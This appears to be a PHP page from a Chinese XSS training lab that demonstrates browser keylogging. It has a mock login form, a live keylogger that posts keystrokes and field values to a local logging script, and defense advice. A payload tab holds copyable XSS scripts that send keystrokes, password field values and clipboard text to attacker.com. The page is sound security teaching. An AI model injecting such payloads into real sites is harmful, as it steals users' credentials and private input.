<?php
/**
 * 键盘记录演示页面
 * 演示XSS攻击中键盘记录的原理和防御方法
 * 
 * ⚠️ 警告：此页面仅用于安全教育和演示目的
 */

// 处理清空记录请求
if (isset($_GET['clear']) && $_GET['clear'] === 'true') {
    file_put_contents(__DIR__ . '/data/keylog.txt', '');
    header('Location: keylogger_demo.php');
    exit;
}

// 读取键盘记录
$keylogFile = __DIR__ . '/data/keylog.txt';
$keylogs = [];
if (file_exists($keylogFile)) {
    $content = file_get_contents($keylogFile);
    if (!empty($content)) {
        $keylogs = json_decode($content, true) ?: [];
    }
}

// 统计数据
$totalKeystrokes = 0;
$uniqueSessions = count($keylogs);
foreach ($keylogs as $log) {
    $totalKeystrokes += strlen($log['keys'] ?? '');
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>键盘记录演示 - XSS靶场</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        .keylogger-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .demo-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        
        @media (max-width: 900px) {
            .demo-section {
                grid-template-columns: 1fr;
            }
        }
        
        .panel {
            background: white;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
        }
        
        .panel h3 {
            margin: 0 0 20px 0;
            padding-bottom: 10px;
            border-bottom: 2px solid #e74c3c;
            color: #2c3e50;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-card.danger {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
        }
        
        .stat-card .number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .stat-card .label {
            font-size: 14px;
            opacity: 0.9;
        }
        
        /* 登录表单样式 */
        .fake-login-form {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 10px;
            border: 1px solid #e9ecef;
        }
        
        .fake-login-form h4 {
            margin: 0 0 20px 0;
            color: #2c3e50;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
        }
        
        /* 实时捕获显示 */
        .capture-display {
            background: #1a1a2e;
            color: #00ff00;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            min-height: 150px;
            max-height: 300px;
            overflow-y: auto;
            position: relative;
        }
        
        .capture-display::before {
            content: '🔴 实时捕获';
            position: absolute;
            top: 10px;
            right: 10px;
            color: #e74c3c;
            font-size: 12px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .capture-line {
            margin-bottom: 8px;
            padding: 5px;
            border-left: 3px solid #00ff00;
            padding-left: 10px;
        }
        
        .capture-line .time {
            color: #888;
            font-size: 12px;
        }
        
        .capture-line .keys {
            color: #00ff00;
            font-size: 14px;
        }
        
        .capture-line .special-key {
            background: #e74c3c;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 11px;
            margin: 0 2px;
        }
        
        /* 记录列表 */
        .log-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .log-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            border-left: 4px solid #e74c3c;
        }
        
        .log-item .log-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 12px;
            color: #666;
        }
        
        .log-item .log-content {
            font-family: 'Courier New', monospace;
            background: #1a1a2e;
            color: #00ff00;
            padding: 10px;
            border-radius: 5px;
            font-size: 13px;
            word-break: break-all;
        }
        
        .log-item .log-content .password {
            background: #e74c3c;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
        }
        
        /* 防御演示 */
        .defense-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .defense-tab {
            padding: 10px 20px;
            background: #f0f0f0;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .defense-tab.active {
            background: #667eea;
            color: white;
        }
        
        .defense-content {
            display: none;
        }
        
        .defense-content.active {
            display: block;
        }
        
        .code-block {
            background: #1a1a2e;
            color: #fff;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            overflow-x: auto;
            position: relative;
        }
        
        .code-block .comment {
            color: #6a9955;
        }
        
        .code-block .keyword {
            color: #569cd6;
        }
        
        .code-block .string {
            color: #ce9178;
        }
        
        .code-block .function {
            color: #dcdcaa;
        }
        
        /* 攻击向量说明 */
        .attack-vectors {
            margin-top: 20px;
        }
        
        .vector-item {
            background: #fff3cd;
            border: 1px solid #ffc107;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
        }
        
        .vector-item h5 {
            margin: 0 0 10px 0;
            color: #856404;
        }
        
        .vector-item code {
            background: #fff;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 12px;
        }
        
        /* 清空按钮 */
        .clear-btn {
            background: #e74c3c;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .clear-btn:hover {
            background: #c0392b;
        }
        
        /* Payload展示 */
        .payload-box {
            background: #1a1a2e;
            color: #00ff00;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            overflow-x: auto;
            margin: 10px 0;
        }
        
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: #667eea;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .copy-btn:hover {
            background: #764ba2;
        }
        
        /* 返回按钮 */
        .back-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 12px 24px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
            transition: all 0.3s ease;
            z-index: 1000;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .back-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        .warning-banner {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .warning-banner .icon {
            font-size: 24px;
        }
        
        .instruction-steps {
            background: #e3f2fd;
            border: 1px solid #2196f3;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        
        .instruction-steps h4 {
            margin: 0 0 15px 0;
            color: #1565c0;
        }
        
        .instruction-steps ol {
            margin: 0;
            padding-left: 20px;
        }
        
        .instruction-steps li {
            margin-bottom: 8px;
            color: #424242;
        }
    </style>
</head>
<body>
    <div class="keylogger-container">
        <div class="page-header">
            <h1>⌨️ 键盘记录攻击演示</h1>
            <p class="subtitle">演示XSS攻击中键盘记录的原理、危害与防御方法</p>
        </div>
        
        <div class="warning-banner">
            <span class="icon">⚠️</span>
            <div>
                <strong>安全警告</strong>：此页面仅用于安全教育和演示目的。在实际环境中，键盘记录攻击是严重的犯罪行为。请勿将此技术用于非法用途。
            </div>
        </div>
        
        <!-- 统计卡片 -->
        <div class="stats-grid">
            <div class="stat-card danger">
                <div class="number"><?php echo $totalKeystrokes; ?></div>
                <div class="label">捕获按键总数</div>
            </div>
            <div class="stat-card">
                <div class="number"><?php echo $uniqueSessions; ?></div>
                <div class="label">受影响会话数</div>
            </div>
        </div>
        
        <!-- 演示区域 -->
        <div class="demo-section">
            <!-- 左侧：模拟登录表单 -->
            <div class="panel">
                <h3>🎯 模拟登录页面（存在键盘记录）</h3>
                
                <div class="instruction-steps">
                    <h4>📝 演示步骤：</h4>
                    <ol>
                        <li>在下方登录表单中输入用户名和密码</li>
                        <li>观察右侧"实时捕获"区域的显示</li>
                        <li>查看下方"已捕获记录"了解存储的数据</li>
                        <li>点击"查看攻击代码"了解攻击原理</li>
                    </ol>
                </div>
                
                <div class="fake-login-form">
                    <h4>🔐 用户登录</h4>
                    <form id="loginForm" onsubmit="return false;">
                        <div class="form-group">
                            <label>用户名：</label>
                            <input type="text" id="username" placeholder="请输入用户名" autocomplete="off">
                        </div>
                        <div class="form-group">
                            <label>密码：</label>
                            <input type="password" id="password" placeholder="请输入密码" autocomplete="off">
                        </div>
                        <div class="form-group">
                            <label>确认密码：</label>
                            <input type="password" id="confirmPassword" placeholder="请再次输入密码" autocomplete="off">
                        </div>
                        <button type="submit" class="login-btn">登录</button>
                    </form>
                </div>
                
                <!-- 攻击向量说明 -->
                <div class="attack-vectors">
                    <h4>🦠 常见键盘记录攻击向量</h4>
                    
                    <div class="vector-item">
                        <h5>1. 全局键盘监听</h5>
                        <code>document.addEventListener('keydown', function(e) { ... })</code>
                        <p style="margin: 10px 0 0 0; color: #666;">监听整个页面的键盘事件，捕获所有按键</p>
                    </div>
                    
                    <div class="vector-item">
                        <h5>2. 表单输入监听</h5>
                        <code>document.querySelectorAll('input').forEach(input => { ... })</code>
                        <p style="margin: 10px 0 0 0; color: #666;">针对特定输入框进行监听，常用于窃取密码</p>
                    </div>
                    
                    <div class="vector-item">
                        <h5>3. 剪贴板窃取</h5>
                        <code>document.addEventListener('paste', function(e) { ... })</code>
                        <p style="margin: 10px 0 0 0; color: #666;">监听粘贴事件，获取剪贴板内容</p>
                    </div>
                </div>
            </div>
            
            <!-- 右侧：实时捕获显示 -->
            <div class="panel">
                <h3>📡 实时捕获显示</h3>
                
                <div class="capture-display" id="captureDisplay">
                    <div style="color: #888; text-align: center; padding: 50px 0;">
                        等待键盘输入...<br>
                        <span style="font-size: 12px;">在左侧表单中输入内容</span>
                    </div>
                </div>
                
                <!-- 攻击代码展示 -->
                <div style="margin-top: 20px;">
                    <h4>🔍 查看攻击代码</h4>
                    
                    <div class="defense-tabs">
                        <button class="defense-tab active" onclick="showDefenseTab('attack')">攻击代码</button>
                        <button class="defense-tab" onclick="showDefenseTab('defense')">防御方法</button>
                        <button class="defense-tab" onclick="showDefenseTab('payload')">注入Payload</button>
                    </div>
                    
                    <div id="attack" class="defense-content active">
                        <div class="code-block" style="position: relative;">
                            <button class="copy-btn" onclick="copyCode('attackCode')">复制</button>
                            <pre id="attackCode"><span class="comment">// 恶意键盘记录脚本</span>
<span class="keyword">var</span> keystrokes = <span class="string">''</span>;
<span class="keyword">var</span> targetInputs = [<span class="string">'username'</span>, <span class="string">'password'</span>, <span class="string">'confirmPassword'</span>];

<span class="comment">// 监听所有键盘事件</span>
document.<span class="function">addEventListener</span>(<span class="string">'keydown'</span>, <span class="keyword">function</span>(e) {
    <span class="keyword">var</span> key = e.key;
    
    <span class="comment">// 特殊按键处理</span>
    <span class="keyword">if</span> (e.key === <span class="string">'Enter'</span>) key = <span class="string">'[ENTER]'</span>;
    <span class="keyword">if</span> (e.key === <span class="string">'Tab'</span>) key = <span class="string">'[TAB]'</span>;
    <span class="keyword">if</span> (e.key === <span class="string">'Backspace'</span>) key = <span class="string">'[BACK]'</span>;
    
    keystrokes += key;
    
    <span class="comment">// 发送到攻击者服务器</span>
    <span class="function">sendToAttacker</span>(keystrokes);
});

<span class="comment">// 监听特定输入框</span>
targetInputs.<span class="function">forEach</span>(<span class="keyword">function</span>(id) {
    <span class="keyword">var</span> input = document.<span class="function">getElementById</span>(id);
    <span class="keyword">if</span> (input) {
        input.<span class="function">addEventListener</span>(<span class="string">'input'</span>, <span class="keyword">function</span>(e) {
            <span class="function">sendToAttacker</span>({
                field: id,
                value: e.target.value
            });
        });
    }
});</pre>
                        </div>
                    </div>
                    
                    <div id="defense" class="defense-content">
                        <div class="code-block" style="position: relative;">
                            <button class="copy-btn" onclick="copyCode('defenseCode')">复制</button>
                            <pre id="defenseCode"><span class="comment">// 1. 内容安全策略 (CSP)</span>
<span class="comment">// 在HTTP响应头中设置：</span>
Content-Security-Policy: default-src <span class="string">'self'</span>; script-src <span class="string">'self'</span>

<span class="comment">// 2. 输入过滤和输出编码</span>
<span class="keyword">function</span> <span class="function">sanitize</span>(input) {
    <span class="keyword">return</span> input
        .<span class="function">replace</span>(<span class="string">/&/g</span>, <span class="string">'&amp;'</span>)
        .<span class="function">replace</span>(<span class="string">/</g</span>, <span class="string">'&lt;'</span>)
        .<span class="function">replace</span>(<span class="string">/>/g</span>, <span class="string">'&gt;'</span>)
        .<span class="function">replace</span>(<span class="string">/"/g</span>, <span class="string">'&quot;'</span>)
        .<span class="function">replace</span>(<span class="string">/'/g</span>, <span class="string">'&#x27;'</span>);
}

<span class="comment">// 3. HttpOnly Cookie</span>
<span class="comment">// 防止JavaScript访问敏感Cookie</span>
<span class="function">setcookie</span>(<span class="string">'session'</span>, $token, time()+3600, <span class="string">'/'</span>, <span class="string">''</span>, <span class="keyword">true</span>, <span class="keyword">true</span>);

<span class="comment">// 4. 使用框架的安全功能</span>
<span class="comment">// Vue.js: 自动转义 {{ }}</span>
<span class="comment">// React: 自动转义 JSX</span>
<span class="comment">// Angular: 自动转义 {{ }}</span></pre>
                        </div>
                        
                        <div style="margin-top: 15px; padding: 15px; background: #d4edda; border-radius: 8px;">
                            <strong>✅ 最佳实践：</strong>
                            <ul style="margin: 10px 0 0 0; padding-left: 20px;">
                                <li>始终使用CSP策略限制脚本执行</li>
                                <li>对所有用户输入进行过滤和编码</li>
                                <li>使用HttpOnly标记敏感Cookie</li>
                                <li>定期进行安全审计和渗透测试</li>
                                <li>使用Web应用防火墙(WAF)</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div id="payload" class="defense-content">
                        <p style="color: #666; margin-bottom: 15px;">以下Payload可注入到存在XSS漏洞的页面中：</p>
                        
                        <div class="payload-box" style="position: relative;">
                            <button class="copy-btn" onclick="copyCode('payload1')">复制</button>
                            <pre id="payload1"><span class="comment">&lt;!-- 基础键盘记录Payload --&gt;</span>
&lt;script&gt;
<span class="keyword">var</span> k=<span class="string">''</span>,s=<span class="keyword">new</span> Image();
document.<span class="function">onkeypress</span>=<span class="keyword">function</span>(e){
    k+=e.key;
    <span class="keyword">if</span>(k.length&gt;10){
        s.src=<span class="string">'http://attacker.com/steal.php?k='</span>+<span class="function">btoa</span>(k);
        k=<span class="string">''</span>;
    }
};
&lt;/script&gt;</pre>
                        </div>
                        
                        <div class="payload-box" style="position: relative;">
                            <button class="copy-btn" onclick="copyCode('payload2')">复制</button>
                            <pre id="payload2"><span class="comment">&lt;!-- 表单窃取Payload --&gt;</span>
&lt;script&gt;
document.<span class="function">querySelectorAll</span>(<span class="string">'input[type="password"]'</span>).<span class="function">forEach</span>(<span class="keyword">function</span>(i){
    i.<span class="function">addEventListener</span>(<span class="string">'blur'</span>,<span class="keyword">function</span>(){
        <span class="keyword">new</span> Image().src=<span class="string">'http://attacker.com/steal.php?p='</span>+i.value;
    });
});
&lt;/script&gt;</pre>
                        </div>
                        
                        <div class="payload-box" style="position: relative;">
                            <button class="copy-btn" onclick="copyCode('payload3')">复制</button>
                            <pre id="payload3"><span class="comment">&lt;!-- 剪贴板窃取Payload --&gt;</span>
&lt;script&gt;
document.<span class="function">addEventListener</span>(<span class="string">'paste'</span>,<span class="keyword">function</span>(e){
    <span class="keyword">var</span> data=e.clipboardData.<span class="function">getData</span>(<span class="string">'text'</span>);
    <span class="keyword">new</span> Image().src=<span class="string">'http://attacker.com/steal.php?c='</span>+data;
});
&lt;/script&gt;</pre>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- 已捕获记录 -->
        <div class="panel" style="margin-top: 20px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; border: none; padding: 0;">📋 已捕获的键盘记录</h3>
                <div>
                    <a href="?clear=true" class="clear-btn" onclick="return confirm('确定要清空所有记录吗？')">🗑️ 清空记录</a>
                </div>
            </div>
            
            <?php if (empty($keylogs)): ?>
                <div style="text-align: center; padding: 40px; color: #999;">
                    <div style="font-size: 48px; margin-bottom: 10px;">📭</div>
                    <p>暂无捕获记录</p>
                    <p style="font-size: 12px;">在上方登录表单中输入内容开始演示</p>
                </div>
            <?php else: ?>
                <div class="log-list">
                    <?php foreach (array_reverse($keylogs) as $index => $log): ?>
                        <div class="log-item">
                            <div class="log-header">
                                <span>📍 来源：<?php echo htmlspecialchars($log['ip'] ?? '未知'); ?></span>
                                <span>🕐 时间：<?php echo htmlspecialchars($log['timestamp'] ?? ''); ?></span>
                            </div>
                            <div class="log-content">
                                <?php 
                                $keys = $log['keys'] ?? '';
                                // 高亮特殊按键
                                $keys = preg_replace('/\[([A-Z]+)\]/', '<span class="password">[$1]</span>', htmlspecialchars($keys));
                                echo $keys;
                                ?>
                            </div>
                            <?php if (!empty($log['fields'])): ?>
                                <div style="margin-top: 10px; padding: 10px; background: #fff; border-radius: 5px;">
                                    <strong>字段数据：</strong>
                                    <ul style="margin: 5px 0 0 0; padding-left: 20px;">
                                        <?php foreach ($log['fields'] as $field => $value): ?>
                                            <li><?php echo htmlspecialchars($field); ?>: <code><?php echo htmlspecialchars($value); ?></code></li>
                                        <?php endforeach; ?>
                                    </ul>
                                </div>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- 返回按钮 -->
        <a href="demo.php" class="back-btn">🏠 返回演示首页</a>
    </div>
    
    <script>
        // 键盘记录演示脚本
        var captureDisplay = document.getElementById('captureDisplay');
        var keystrokes = '';
        var fieldData = {};
        var captureLines = [];
        
        // 特殊按键映射
        var specialKeys = {
            'Enter': '[ENTER]',
            'Tab': '[TAB]',
            'Backspace': '[BACK]',
            'Delete': '[DEL]',
            'Escape': '[ESC]',
            'ArrowUp': '[↑]',
            'ArrowDown': '[↓]',
            'ArrowLeft': '[←]',
            'ArrowRight': '[→]',
            'Shift': '[SHIFT]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        
        // 监听键盘事件
        document.addEventListener('keydown', function(e) {
            var key = specialKeys[e.key] || e.key;
            keystrokes += key;
            
            // 添加到捕获显示
            addCaptureLine(key, e);
            
            // 每10个字符发送一次（模拟真实攻击）
            if (keystrokes.length >= 10) {
                sendKeylog();
            }
        });
        
        // 监听输入框
        ['username', 'password', 'confirmPassword'].forEach(function(id) {
            var input = document.getElementById(id);
            if (input) {
                input.addEventListener('input', function(e) {
                    fieldData[id] = e.target.value;
                });
                
                input.addEventListener('blur', function(e) {
                    if (Object.keys(fieldData).length > 0) {
                        sendKeylog();
                    }
                });
            }
        });
        
        // 添加捕获行
        function addCaptureLine(key, e) {
            var time = new Date().toLocaleTimeString();
            var target = e.target.id || e.target.tagName;
            
            // 清除初始提示
            if (captureLines.length === 0) {
                captureDisplay.innerHTML = '';
            }
            
            var line = document.createElement('div');
            line.className = 'capture-line';
            
            var isSpecial = specialKeys[e.key];
            var keyDisplay = isSpecial ? 
                '<span class="special-key">' + key + '</span>' : 
                '<span class="keys">' + key + '</span>';
            
            line.innerHTML = '<span class="time">[' + time + '] ' + target + ':</span> ' + keyDisplay;
            
            captureDisplay.appendChild(line);
            captureLines.push({ time: time, key: key, target: target });
            
            // 自动滚动到底部
            captureDisplay.scrollTop = captureDisplay.scrollHeight;
        }
        
        // 发送键盘记录
        function sendKeylog() {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'save_keylog.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('keys=' + encodeURIComponent(keystrokes) + '&fields=' + encodeURIComponent(JSON.stringify(fieldData)));
            
            // 重置
            keystrokes = '';
        }
        
        // 显示防御标签页
        function showDefenseTab(tabId) {
            // 隐藏所有内容
            document.querySelectorAll('.defense-content').forEach(function(content) {
                content.classList.remove('active');
            });
            
            // 移除所有标签的active状态
            document.querySelectorAll('.defense-tab').forEach(function(tab) {
                tab.classList.remove('active');
            });
            
            // 显示选中的内容
            document.getElementById(tabId).classList.add('active');
            
            // 激活选中的标签
            event.target.classList.add('active');
        }
        
        // 复制代码
        function copyCode(elementId) {
            var code = document.getElementById(elementId).textContent;
            navigator.clipboard.writeText(code).then(function() {
                var btn = event.target;
                var originalText = btn.textContent;
                btn.textContent = '已复制!';
                btn.style.background = '#27ae60';
                setTimeout(function() {
                    btn.textContent = originalText;
                    btn.style.background = '#667eea';
                }, 2000);
            });
        }
        
        // 页面离开时发送剩余数据
        window.addEventListener('beforeunload', function() {
            if (keystrokes.length > 0 || Object.keys(fieldData).length > 0) {
                navigator.sendBeacon('save_keylog.php', new URLSearchParams({
                    keys: keystrokes,
                    fields: JSON.stringify(fieldData)
                }));
            }
        });
    </script>
</body>
</html>